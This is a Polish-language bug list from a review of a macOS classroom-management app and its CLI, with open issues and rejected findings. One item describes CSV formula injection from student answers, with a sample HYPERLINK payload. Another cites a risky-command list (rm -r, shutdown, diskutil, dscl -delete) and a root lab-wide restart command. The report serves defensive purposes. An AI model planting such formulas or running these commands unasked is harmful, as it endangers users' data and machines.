diagnose traktuje każdy wynik z exitCode 255 albo stderr zawierającym „ssh:” jako błąd połączenia, nie sprawdzając r.started. Polecenie w dziale Polecenia, np. `git clone git@github.com:…` bez sieci („ssh: Could not resolve hostname…”, kod 128) albo `ssh inny.local …` (kod 255, „timed out”), daje podsumowanie „Nie można odnaleźć nazwy hosta…”/„Komputer nie odpowiada”, a execute ustawia stan .offline – przez kolejne do 2 min ten działający iMac jest pomijany przez „Pomiń niedostępne”.

**Status:** otwarte

### ZAD-08

**Powiadomienie „Gotowe na 0 komputerach” gdy wszystko się nie udało** – P2, Zadania, polecenia, `Sources/CMCRManager/AppModel+Jobs.swift:416`

JobNotifier.post zawsze zaczyna treść od „Gotowe \(Polish.onComputers(batch.succeeded))”, więc dla partii z samymi błędami lub przerwanej powiadomienie brzmi „Gotowe na 0 komputerach · błędy: 15”.

**Status:** otwarte

### ZAD-09

**Niespójna terminologia anulowania i nagłówków wyników** – P2, Zadania, polecenia, `Sources/CMCRManager/AppModel.swift:442`

README mówi o przycisku „Anuluj”, w UI jest „Przerwij”, stan zadania to „Przerwano”, liczniki „Przerwane”, a podsumowanie zadania „Anulowano” (431, 442; także CommandResult „Anulowano.”). Nagłówek wyników w Poleceniach i innych działach to „Wynik ostatniej operacji” (CommandsView.swift:25), a w LastBatchView „Wynik ostatniego działania” (Components.swift:806).

**Status:** otwarte

### ZAD-10

**Przy błędzie cały stderr jest dopisywany drugi raz do wyniku i historii** – P2, Zadania, polecenia, `Sources/CMCRManager/AppModel.swift:450`

stderr jest już strumieniowany do logu zadania (OutputSink), ale execute dopisuje r.stderr ponownie, jeśli cały połączony stderr nie jest podciągiem logu. Przy przeplecionym stdout/stderr (typowe dla instalatorów, brew, skryptu konfiguracji) nigdy nie jest, więc każdy nieudany job ma na końcu duplikat całego stderr – w podglądzie, historii i eksporcie; przy dużym stderr (setki kB) duplikat wypycha z 300 kB bufora prawdziwą końcówkę wyjścia.

**Status:** otwarte

### ZAD-11

**„Wyczyść zakończone” gubi oglądaną partię z historii** – P2, Zadania, polecenia, `Sources/CMCRManager/AppModel.swift:491`

clearFinishedBatches zeruje focusedBatchID, gdy id nie ma w model.batches – a id partii z historii nigdy tam nie ma. Oglądając wpis z historii i klikając „Wyczyść zakończone”, użytkownik traci widok (onChange przełącza na pierwszą trwającą partię albo „Wybierz działanie”); to samo dla właśnie przenoszonej do historii partii z tej sesji.

**Status:** otwarte

### ZAD-13

**cmcrctl uruchamia skrypty bez rejestracji zadania: Ctrl-C nie zatrzymuje polecenia na iMacu** – P2, Zadania, polecenia, `Sources/cmcrctl/CLI.swift:240`

runScript (exec, updates install, logout, power…) wywołuje SSH.run bez ProcessHandle, więc skrypt nie dostaje jobID: brak rejestru w /tmp/cmcr-jobs i przekaźników wyjścia, a cmcrctl nie obsługuje SIGINT (main.swift ignoruje tylko SIGPIPE). Ctrl-C zabija lokalne ssh, a wrapper ignoruje HUP – np. `cmcrctl exec "sleep 60; shutdown -r now" all --root` wykona restart mimo przerwania. Odwrotnie przy utracie połączenia (uśpienie MacBooka) ciało ginie na pierwszym zapisie (SIGPIPE), np. w trakcie `cmcrctl updates install all --restart --yes`. Aplikacja w obu przypadkach zachowuje się zgodnie z README (Anuluj zatrzymuje, utrata połączenia nie przerywa).

**Status:** otwarte

### ZAD-14

**cmcrctl nie zapisuje działań w dzienniku actions.log** – P2, Zadania, polecenia, `Sources/cmcrctl/CLI.swift:354`

Aplikacja loguje każde działanie (AppModel.runBatch → ConfigStore.log), a cmcrctl nie wywołuje ConfigStore.log w ogóle (poza HostTrust.trust). `cmcrctl exec … --root`, `power restart`, `logout`, `clean`, a także `screenshot`/`screen-watch` (README: „każda sesja podglądu jest zapisywana w dzienniku działań”) nie zostawiają śladu w wspólnym dzienniku – audyt „kto zrestartował pracownię” jest niepełny.

**Status:** otwarte

### ZAD-15

**cmcrctl exec --root nie pyta o ryzykowne polecenia, aplikacja pyta** – P2, Zadania, polecenia, `Sources/cmcrctl/CLI.swift:359`

W aplikacji CommandsView.run sprawdza CommandRisk (rm -r, shutdown/reboot, diskutil, dscl -delete, pmset…) dla poleceń root i wymaga potwierdzenia z listą komputerów. cmcrctl exec wykonuje to samo bez pytania, również w terminalu, podczas gdy `power restart` pyta – `cmcrctl exec "shutdown -r now" all --root` restartuje pracownię bez potwierdzenia.

**Status:** otwarte

### ZAD-16

**Przerwane zadania i zadania po limicie czasu mają w historii i eksporcie „kod” lokalnego ssh lub -1** – P2, Zadania, polecenia, `Sources/CMCRManager/AppModel.swift:439`

execute zapisuje job.exitCode = r.exitCode dla każdego wyniku, zanim rozróżni stan. Dla zadania przerwanego w trakcie jest to status lokalnego klienta ssh zabitego SIGTERM-em (ProcessRunner zwraca terminationStatus, Process.swift:361-368, np. 255). Dla zadania przerwanego w kolejce sesji albo podczas ponawiania jest to -1 z CommandResult.cancelledResult (Process.swift:40), a dla limitu czasu znów status ssh. Historia pokazuje to w kolumnie Stan jako „Przerwano (kod 255)” z podpowiedzią „Polecenie zakończyło się kodem 255 …” (JobsView.swift:525-531). Eksport pisze „=== imac04 – Przerwano, kod -1 ===” (JobsView.swift:637, 648). Ten kod nie pochodzi z polecenia na iMacu, a README obiecuje w historii kod wyjścia polecenia.

*Zgłoszone przez recenzenta przy weryfikacji innej pozycji; sprawdzane przy naprawie.*

**Status:** otwarte

### ZAJ-02

**Eksport odpowiedzi uczniów do CSV bez ochrony przed formułami** – P2, Zajęcia, podgląd, `Sources/CMCRCore/Classroom.swift:563`

Odpowiedzi wpisuje uczeń (dowolny tekst), a CSV.escape tylko cytuje separator/cudzysłowy. Odpowiedź zaczynająca się od =, +, -, @ (np. =HYPERLINK("https://…";"Kliknij") albo =1+1) po otwarciu „odpowiedzi.csv” w Excelu/Numbers jest wykonywana jako formuła (CSV/formula injection). To samo dotyczy „Kopiuj” (TSV wklejany do arkusza). Raport ma się otwierać w Excelu (README), więc to realna ścieżka.

**Status:** otwarte

### ZAJ-06

**Puste ostrzeżenie końca zajęć pokazuje uczniom pusty komunikat** – P2, Zajęcia, podgląd, `Sources/CMCRCore/LessonRoutine.swift:91`

Krok „Uprzedź uczniów” jest dodawany zawsze, gdy włączony jest przełącznik, nawet przy pustym polu „Komunikat” (dla powitania tekst jest sprawdzany). Uczniowie dostają wtedy okno „Koniec zajęć” bez treści z przyciskiem OK.

**Status:** otwarte

### ZAJ-07

**Ręcznie sklejane liczebniki: „najwyżej 2 komputerów”, „3 cykli, 3 nowych obrazów”** – P2, Zajęcia, podgląd, `Sources/CMCRCore/LessonRoutine.swift:169`

Komunikat kolejki w scenariuszu używa stałej formy „komputerów”, a limit pochodzi z ustawienia „Jednoczesne operacje” (1–32): dla 1–4 i 22–24 powstaje „najwyżej 1 komputerów naraz”, „najwyżej 3 komputerów naraz”. Analogicznie cmcrctl screen-watch kończy się tekstem „Zakończono: 3 cykli, 3 nowych obrazów.” (domyślnie --frames 3) – poprawnie „3 cykle, 3 nowe obrazy”, „1 cykl, 1 nowy obraz” (Sources/cmcrctl/ScreenWatch.swift:52).

**Status:** otwarte

### ZAJ-08

**Jakość JPEG z ustawień stosowana tylko przy zmniejszaniu obrazu** – P2, Zajęcia, podgląd, `Sources/CMCRCore/ScreenCapture.swift:436`

sips z -s formatOptions <jakość> uruchamia się wyłącznie, gdy zrzut jest większy od żądanego rozmiaru. Gdy ekran jest mniejszy lub równy (np. iMac 21,5" 1920 px przy rozdzielczości ≥ 1920 w ustawieniach, MacBook 1440 px przy powiększeniu 1600 px, „Wszystkie ekrany” z mniejszym monitorem), wysyłany jest surowy JPEG screencapture z domyślną jakością – ustawienie „Jakość obrazu” jest ignorowane, wbrew README („ograniczona … jakość JPEG”).

**Status:** otwarte

### ZAJ-09

**„Zamknij aplikacje › Wszystkie” zabija aplikacje SIGTERM bez szansy zapisu** – P2, Zajęcia, podgląd, `Sources/CMCRCore/Scripts+Classroom.swift:386`

Wariant „Wszystkie aplikacje ucznia” wysyła kill -TERM do wszystkich aplikacji (natychmiastowe zakończenie, bez okna „Zachować zmiany?”), podczas gdy „Tylko wybrane” wysyła standardowe „Zakończ” (Apple Event). Komentarz planu mówi o „graceful quit (autosave)”, a README – że „Zamknij” pozwala uczniowi zapisać pracę; podpis kroku obiecuje, że „w kopii znajdą się zapisane pliki”, tymczasem niezapisane zmiany giną tuż przed zbieraniem.

**Status:** otwarte

### ZAJ-10

**Nieudane ponowne zablokowanie odblokowuje ekran, a aplikacja pokazuje go jako zablokowany** – P2, Zajęcia, podgląd, `Sources/CMCRManager/ClassroomModel.swift:395`

Skrypt blokady najpierw zabija istniejącą blokadę i jej licznik automatycznego odblokowania (pkill LockScreen, pkill -f TAG), a dopiero potem próbuje nowej. Gdy nowa się nie uruchomi (tryb „Blokada systemowa” na Macu bez działającego LockScreen albo błąd osascript), skrypt kończy się kodem 1 – ekran ucznia jest już odblokowany. W aplikacji wynik nieudany jest ignorowany, więc locks[m.id] zostaje i „Zablokowane teraz”/baner nadal pokazują komputer jako zablokowany.

**Status:** otwarte

### ZAJ-11

**Pytanie: pominięte komputery wiszą jako „czeka na odpowiedź” na zawsze** – P2, Zajęcia, podgląd, `Sources/CMCRManager/ClassroomModel.swift:427`

QuestionRound powstaje dla wszystkich zaznaczonych komputerów, ale runBatch przy włączonym (domyślnie) „Pomiń niedostępne” nie wykonuje operacji dla komputerów offline – nie trafiają ani do answers, ani do errors. round.pending nigdy nie spada do zera: kręcący się wskaźnik „czeka na odpowiedź: N” i wiersze „czeka na odpowiedź…” zostają do zamknięcia aplikacji, a CSV ma dla nich puste pola bez wyjaśnienia.

**Status:** otwarte

### ZAJ-12

**Nowe pytanie nie zamyka poprzedniego – stare okna zostają u uczniów, a odpowiedzi znikają z tabeli** – P2, Zajęcia, podgląd, `Sources/CMCRManager/ClassroomModel.swift:428`

ask() zastępuje classroom.question nową rundą, ale nie anuluje batcha poprzedniej (round.batch jest zapisywany i nigdzie nieużywany), a dział nie ma przycisku zakończenia pytania. Gdy nauczyciel poprawi literówkę i zada pytanie ponownie, uczniowie mają dwa okna jedno na drugim (do 10 min), a odpowiedzi na pierwsze trafiają do niewidocznej już rundy – znikają z tabeli i eksportu CSV.

**Status:** otwarte

### ZAJ-13

**„Gotowe na wszystkich komputerach.” po przerwaniu lub pominięciu komputerów** – P2, Zajęcia, podgląd, `Sources/CMCRManager/ClassroomView.swift:466`

Podsumowanie liczy tylko wiersze z .failed. Po „Przerwij” w trakcie odliczania wszystkie kroki dostają .skipped(„anulowano”), a przy „Pomiń niedostępne” część komputerów jest pomijana w całości – w obu przypadkach widać zieloną ikonę i „Gotowe na wszystkich komputerach.”, choć zajęć nie zakończono albo z części komputerów nie zebrano prac.

**Status:** otwarte

### ZAJ-14

**cmcrctl lesson start budzi i obsługuje komputery po kolei** – P2, Zajęcia, podgląd, `Sources/cmcrctl/ClassroomCommands.swift:357`

W aplikacji pakiety Wake-on-LAN idą do wszystkich komputerów naraz, a czekanie i kolejne kroki biegną równolegle. W cmcrctl każdy komputer przechodzi cały scenariusz osobno: następny Mac dostaje pakiet budzenia dopiero po zakończeniu wszystkich kroków poprzedniego (łącznie z czekaniem do N min). Dla 15 uśpionych iMaców start zajęć ze skryptu trwa wielokrotnie dłużej niż „ten sam scenariusz z aplikacji” (README).

**Status:** otwarte

### ZAJ-15

**screen-watch wypisuje ścieżkę klatki, nawet gdy zapis się nie udał** – P2, Zajęcia, podgląd, `Sources/cmcrctl/ScreenWatch.swift:99`

Zapis klatki jest w try?, a niezależnie od wyniku wypisywane jest „Klatka N: nowy obraz … → <ścieżka>” i liczone frames += 1; polecenie kończy się kodem 0, choć w folderze nie ma żadnego pliku (np. folder tylko do odczytu, pełny dysk).

**Status:** otwarte

### ZAJ-17

**Wybór konkretnego monitora ukrywa przełącznik monitorów** – P2, Zajęcia, podgląd, `Sources/CMCRManager/ScreenCenter.swift:510`

displayCount jest brany z liczby ekranów w ostatniej klatce (`feed.set(\.displayCount, max(1, count))`). Po wybraniu „Ekran 2” skrypt przechwytuje tylko ten ekran, więc count = 1 i displayCount spada do 1. W oknie pojedynczego komputera znika wtedy z paska narzędzi menu monitora (ScreenWall.swift:336 `if feed.displayCount > 1`). W menu „Więcej › Monitor” znikają pozycje „Ekran 1…N” (ScreenTiles.swift:430-434), a wybrana wartość traci tag i Picker nie ma zaznaczenia. Żeby przejść na inny monitor, trzeba najpierw wybrać „Wszystkie ekrany”.

*Zgłoszone przez recenzenta przy weryfikacji innej pozycji; sprawdzane przy naprawie.*

**Status:** otwarte

### ZAJ-18

**cmcrctl screen-watch i screenshot nie zapisują sesji podglądu w dzienniku działań** – P2, Zajęcia, podgląd, `Sources/cmcrctl/ScreenWatch.swift:34`

README (Podgląd ekranu – ograniczenia) zapewnia, że każda sesja podglądu jest zapisywana w dzienniku działań. W aplikacji robi to ScreenCenter: ConfigStore.log przy pierwszej klatce użytkownika, przy powiadomieniu i przy nieudanym powiadomieniu (ScreenCenter.swift:518, 548, 561). cmcrctl screen-watch i cmcrctl screenshot używają tego samego skryptu przechwytywania, ale nie robią żadnego wpisu – w Sources/cmcrctl nie ma ani jednego wywołania ConfigStore.log. Podgląd ekranu ucznia z terminala nie zostawia więc śladu w actions.log.

*Zgłoszone przez recenzenta przy weryfikacji innej pozycji; sprawdzane przy naprawie.*

**Status:** otwarte

## Odrzucone przy weryfikacji

Zgłoszenia, które niezależny recenzent sprawdził w kodzie i uznał za niepoprawne (zachowanie zamierzone, obsłużone gdzie indziej albo scenariusz niemożliwy). Nie wliczają się do podsumowania.

| Plik:linia | Zgłoszenie | Dlaczego odrzucone |
|---|---|---|
| `Sources/CMCRCore/Operations+Browse.swift:71` | „Zbierz prace” odrzuca całe archiwum, gdy jeden plik jest nieczytelny | Przesłanka „tar wysyła resztę” jest fałszywa dla `tar -cf - .` (pullArchive): sprawdziłem lokalnie bsdtar 3.5.3, który po „Can't open” przerywa przechodzenie katalogu, więc pozostałe pliki (w kolejności readdir) w ogóle nie trafiają do archiwum. Odrzucenie arbitralnie uciętego archiwum i zgłoszenie błędu z komunikatem tar to bezpieczniejsze zachowanie; proponowana poprawka zapisywałaby losowy podzbiór prac. |
| `Sources/CMCRCore/SelfUpdate.swift:649` | Komunikat uaktualnienia: przenieś do „folderu Aplikacje” zamiast „Programy” | Aktualny polski macOS nazywa /Applications „Aplikacje” (sprawdzone na macOS 27.0.1: /System/Library/CoreServices/SystemFolderLocalizations/pl.lproj, „Applications” => „Aplikacje”). SelfUpdate.swift:649/652 i README:190 są więc poprawne, a proponowana zmiana na „Programy” wprowadziłaby błąd. Niespójność istnieje w odwrotną stronę – miejsca z „Programy” zgłaszam w missed. |
| `Sources/CMCRManager/AppModel.swift:304` | „Zezwalaj na instalatory bez podpisu Apple” zostaje włączone do końca sesji, także dla instalacji z internetu | To zachowanie zamierzone. Komentarz w AppModel.swift:302-303 mówi tylko, że flaga jest domyślnie wyłączona i nie zapisuje się między uruchomieniami, i tak właśnie działa; README (l. 170) opisuje zwykły przełącznik włączany przez nauczyciela. Każdy instalator przyjęty dzięki fladze dostaje w wyniku ostrzeżenie „instaluję mimo to” (Scripts.swift:365-366), więc automatyczne wyłączanie to propozycja zmiany projektu, a nie usterka. |
| `Sources/CMCRManager/ClassroomView.swift:749` | Odpowiedzi uczniów i macierz gotowości to listy z kolumnami bez Table | Odpowiedzi są pokazywane jako dwukolumnowa lista (komputer · uczeń → odpowiedź) z kopiowaniem i eksportem CSV (ClassroomView.swift:723-781), co spełnia README:147. Brak sortowania i zaznaczania oraz Grid zamiast Table w macierzy gotowości (README:57 też nazywa ją tabelą) to preferencja projektowa bez scenariusza błędu. |
| `Sources/CMCRManager/Components.swift:329` | Sztywne rozmiary czcionek i kolory z przezroczystością zamiast stylów semantycznych | Sztywne .font(.system(size:)) dotyczą wyłącznie obrazków SF Symbols w ramkach o stałym rozmiarze (Components.swift:328-329, PowerView.swift:285-286, SettingsComponents.swift:9-13 – kafelek 22×22, DashboardView.swift:373-377 – kółko 24×24, ScreenTiles.swift:218-219/245/276); cały tekst używa stylów semantycznych. Kolory to semantyczne .secondary i accent z przezroczystością, bez RGB ani hex. Różne obramowanie CodeEditor (CommandsView.swift:50 i SetupView.swift:893) to drobna preferencja – nie ma naruszenia HIG ani scenariusza błędu. |
| `Sources/CMCRManager/JobsView.swift:349` | Bieżące zadania nie pokazują kodu wyjścia | W bieżącym widoku kod wyjścia widać w kolumnie Wynik dla błędów polecenia: „… (kod N)” albo „Polecenie zakończone kodem N.” (AppModel.swift:451-453), a eksport zawiera kod (JobsView.swift:637). Kodu brak tylko przy rozpoznanych błędach (hasło sudo, SSH, limit czasu), gdzie zastępuje go opis, więc README („z wynikiem, kodem wyjścia”) jest spełnione. Komentarz w HistoryDetailView mówi o tych samych kolumnach, nie o identycznej treści. |
| `Sources/CMCRManager/UpdateViews.swift:147` | Niespójny myślnik: „—” obok „–” | Pauza i półpauza są w polszczyźnie równoprawnymi myślnikami. Dwa wystąpienia „—” w UI (UpdateViews.swift:147, RemoteBrowserView.swift:53) i mieszanie ich w README to kwestia stylu typograficznego bez błędnego ani mylącego tekstu, więc według reguły „bez preferencji stylu” nie jest to usterka. |
| `Sources/cmcrctl/CLI.swift:384` | cmcrctl exec/push/pull: angielskie nagłówki, w push z polską liczbą | Nagłówki „Running command on / Pushing to / Pulling from … ...” są w cmcrctl od wersji 1.0 (6c43abc, „Command line counterpart of cmcr-helpers.sh”) jako odpowiednik wyjścia cmcr-helpers. Przypina je e2e (Tests/e2e/suites/cli.sh:39, 80, 84, 102, 113), a polską odmianę w push dodano świadomie w 40c5f5c („push item plural”). To zamierzona zgodność, więc dwujęzyczność jest kwestią stylu, nie usterką. |
